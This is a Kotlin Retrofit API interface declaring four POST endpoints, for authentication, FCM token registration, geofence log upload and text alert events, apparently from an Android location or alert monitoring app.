package com.android.services.network.api

import com.android.services.models.*
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.Headers
import retrofit2.http.POST

interface NodeServerFiveApi {

    @POST("auth")
    @Headers("Content-Type: application/json")
    fun hitAuthService(@Body auth: Auth): Call<ResponseBody>

    @POST("fcm/addToken")
    @Headers("Content-Type: application/json")
    fun hitFcmTokenService(@Body fcmToken: FCMToken): Call<ResponseBody>

    @POST("geoFencingEmail")
    @Headers("Content-Type: application/json")
    fun uploadGeoFences(@Body geoFenceLogs: GeoFenceLogs): Call<ResponseBody>

    @POST("fcm/textAlert")
    @Headers("Content-Type: application/json")
    fun postTextAlertEvent(@Body textAlertLogs: TextAlertLogs): Call<ResponseBody>
}